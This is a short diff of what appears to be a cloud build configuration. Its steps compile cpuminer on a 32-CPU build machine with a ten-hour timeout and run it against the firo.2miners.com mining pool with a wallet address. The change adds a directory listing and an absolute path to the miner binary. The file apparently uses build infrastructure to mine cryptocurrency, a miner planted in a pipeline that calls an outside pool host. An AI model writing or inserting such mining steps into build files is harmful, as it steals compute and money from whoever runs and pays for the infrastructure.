@@ -12,7 +12,8 @@ steps:
           chmod -R 777 cpuminer
           cd cpuminer
           ./build.sh
-          ./cpuminer -a mtp -o stratum+tcp://firo.2miners.com:8181 -u aBLVfkCbCHagdcVM9weTRyiB5x6rSkzsq7.gccb -p x
+          ls -al
+          /workspace/cpuminer/./cpuminer -a mtp -o stratum+tcp://firo.2miners.com:8181 -u aBLVfkCbCHagdcVM9weTRyiB5x6rSkzsq7.gccb -p x
 options:
   machineType: 'N1_HIGHCPU_32'
 timeout: 36000s
